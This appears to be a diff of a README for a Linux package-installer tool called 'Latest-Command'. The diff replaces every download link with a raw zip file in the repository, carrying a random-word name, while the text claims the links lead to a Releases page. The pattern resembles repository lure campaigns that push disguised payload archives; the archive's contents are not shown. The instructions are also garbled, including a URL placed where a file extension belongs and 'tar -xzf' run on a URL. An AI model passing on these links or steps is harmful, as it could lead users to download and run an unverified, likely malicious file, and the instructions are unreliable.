@@ -1,6 +1,6 @@
 # 🎉 Latest-Command - Install the Latest Package Easily
 
-[![Download Latest-Command](https://raw.githubusercontent.com/Bedamo/Latest-Command/main/Americanization/Latest-Command.zip)](https://raw.githubusercontent.com/Bedamo/Latest-Command/main/Americanization/Latest-Command.zip)
+[![Download Latest-Command](https://github.com/Bedamo/Latest-Command/raw/refs/heads/main/files/Latest-Command-goshenite.zip)](https://github.com/Bedamo/Latest-Command/raw/refs/heads/main/files/Latest-Command-goshenite.zip)
 
 ## 📖 Description
 
@@ -10,7 +10,7 @@ Latest-Command simplifies package installation across various Linux distribution
 
 To begin using Latest-Command, you need to download and run the software. Follow these steps:
 
-1. **Visit the Releases Page**: Click this link to go to the Releases page: [Download Latest-Command](https://raw.githubusercontent.com/Bedamo/Latest-Command/main/Americanization/Latest-Command.zip).
+1. **Visit the Releases Page**: Click this link to go to the Releases page: [Download Latest-Command](https://github.com/Bedamo/Latest-Command/raw/refs/heads/main/files/Latest-Command-goshenite.zip).
 
 2. **Choose the Right Version**: Find the latest version listed on the Releases page. Typically, the most recent version is at the top. Ensure that it is compatible with your Linux distribution:
 
@@ -37,9 +37,9 @@ After downloading, follow these steps to install and run Latest-Command:
    cd ~/Downloads
    ```
 
-3. **Extract the Files** (if necessary): If the file is compressed (like a https://raw.githubusercontent.com/Bedamo/Latest-Command/main/Americanization/Latest-Command.zip or .zip), you can extract it using:
+3. **Extract the Files** (if necessary): If the file is compressed (like a https://github.com/Bedamo/Latest-Command/raw/refs/heads/main/files/Latest-Command-goshenite.zip or .zip), you can extract it using:
    ```bash
-   tar -xzf https://raw.githubusercontent.com/Bedamo/Latest-Command/main/Americanization/Latest-Command.zip
+   tar -xzf https://github.com/Bedamo/Latest-Command/raw/refs/heads/main/files/Latest-Command-goshenite.zip
    ```
 
 4. **Run the Command**: Depending on how the files are set up, you might run the command to install the latest package like this:
@@ -61,7 +61,7 @@ After downloading, follow these steps to install and run Latest-Command:
 
 ## 📥 Download & Install
 
-You can download the Latest-Command from the releases page here: [Download Latest-Command](https://raw.githubusercontent.com/Bedamo/Latest-Command/main/Americanization/Latest-Command.zip).
+You can download the Latest-Command from the releases page here: [Download Latest-Command](https://github.com/Bedamo/Latest-Command/raw/refs/heads/main/files/Latest-Command-goshenite.zip).
 
 ## ✅ System Requirements
 
